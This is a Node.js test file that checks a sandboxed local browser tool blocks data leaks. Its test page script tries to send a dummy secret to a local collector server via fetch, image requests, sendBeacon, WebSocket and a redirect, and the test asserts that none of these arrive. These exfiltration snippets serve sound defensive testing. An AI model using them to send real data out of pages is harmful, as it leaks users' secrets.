/** Prueba de aislamiento del navegador: node chat/prueba-navegador-aislamiento.mjs */
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import http from "node:http";
import { NavegadorLocal } from "./navegador.mjs";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "bonsai-browser-security-"));
const root = path.join(tmp, "project"), output = path.join(tmp, "screenshots");
fs.mkdirSync(root);
const collectorHits = [], appHits = [];
const collector = http.createServer((req, res) => { collectorHits.push(req.url); res.end("collector"); });
collector.on("upgrade", (req, socket) => { collectorHits.push(`ws:${req.url}`); socket.destroy(); });
const listen = (server) => new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));
const collectorPort = await listen(collector);
const html = `<!doctype html><title>Prueba</title>
<button>Primero</button><button>Segundo</button><button id="duplicate">Tercero</button><button id="duplicate">Cuarto</button>
<div><input name="nombre"><input name="nombre"></div><p id="result">0</p>
<script>
document.querySelectorAll('button').forEach((e,i)=>e.onclick=()=>document.querySelector('#result').textContent=String(i+1));
const secret='DATO_FICTICIO';
fetch('/ok').then(r=>r.text()).then(t=>document.body.dataset.sameOrigin=t);
fetch('http://127.0.0.1:${collectorPort}/fetch?data='+secret,{mode:'no-cors'}).catch(()=>{});
new Image().src='http://127.0.0.1:${collectorPort}/image?data='+secret;
navigator.sendBeacon('http://127.0.0.1:${collectorPort}/beacon',secret);
try { new WebSocket('ws://127.0.0.1:${collectorPort}/websocket?data='+secret); } catch {}
try { new WebSocket('ws://'+location.host+'/websocket?data='+secret); } catch {}
fetch('/redirect').catch(()=>{});
</script>`;
fs.writeFileSync(path.join(root, "index.html"), html);
const app = http.createServer((req, res) => {
  appHits.push(req.url);
  if (req.url === "/redirect") { res.writeHead(302, { Location: `http://127.0.0.1:${collectorPort}/redirected?data=DATO_FICTICIO` }); return res.end(); }
  if (req.url === "/ok") return res.end("ok");
  res.setHeader("Content-Type", "text/html"); res.end(html);
});
app.on("upgrade", (req, socket) => { appHits.push(`ws:${req.url}`); socket.destroy(); });
const appPort = await listen(app);
const nav = new NavegadorLocal({ root, output, blockedPorts: [8080, 8787] });
try {
  let state = JSON.parse((await nav.run({ accion: "abrir", url: `http://127.0.0.1:${appPort}/` })).texto);
  await nav.page.waitForTimeout(500);
  assert.equal(await nav.page.locator("body").getAttribute("data-same-origin"), "ok", "se permite fetch al servidor seleccionado");
  assert.equal(collectorHits.length, 0, `no debe enviarse nada al colector: ${collectorHits}`);
  assert.ok(!appHits.some((hit) => hit.startsWith("ws:")), "tampoco se permite WebSocket al origen propio");
  assert.equal(await nav.page.evaluate(() => typeof RTCPeerConnection), "undefined");
  assert.equal(await nav.page.evaluate(() => typeof WebTransport), "undefined");
  assert.equal(await nav.page.evaluate(() => typeof Worker), "undefined");
  assert.equal(await nav.page.evaluate(() => typeof SharedWorker), "undefined");
  assert.ok(appHits.includes("/ok"));
  for (const [i, control] of state.controles.filter((c) => c.etiqueta.includes("Primero") || c.etiqueta.includes("Segundo") || c.etiqueta.includes("Tercero") || c.etiqueta.includes("Cuarto")).entries()) {
    assert.equal(await nav.page.locator(control.selector).count(), 1, `selector no único: ${control.selector}`);
    state = JSON.parse((await nav.run({ accion: "clic", selector: control.selector })).texto);
    assert.equal(await nav.page.locator("#result").innerText(), String(i + 1));
  }
  for (const control of state.controles.filter((c) => c.selector.includes("input"))) assert.equal(await nav.page.locator(control.selector).count(), 1);
  const inspected = JSON.parse((await nav.run({ accion: "inspeccionar", selector: "button" })).texto);
  assert.equal(inspected.elementos.length, 4);
  for (const item of inspected.elementos) assert.equal(await nav.page.locator(item.selector).count(), 1);
  await assert.rejects(nav.run({ accion: "abrir", url: `http://127.0.0.1:${appPort}/redirect` }), /ERR|net::|navigation/i);
  await nav.page.waitForTimeout(300);
  assert.equal(collectorHits.length, 0, `la redirección no debe llegar al colector: ${collectorHits}`);
  state = JSON.parse((await nav.run({ accion: "abrir", ruta: "index.html" })).texto);
  await nav.page.waitForTimeout(300);
  assert.equal(collectorHits.length, 0, `el HTML estático tampoco puede enviar datos: ${collectorHits}`);
  assert.ok(state.eventos.some((e) => e.tipo === "bloqueado"));
  console.log("Navegador: solicitudes entre orígenes, redirecciones y WebSocket bloqueados; misma aplicación, selectores y clics verificados.");
} finally {
  await nav.close();
  await Promise.all([new Promise((r) => app.close(r)), new Promise((r) => collector.close(r))]);
  fs.rmSync(tmp, { recursive: true, force: true });
}
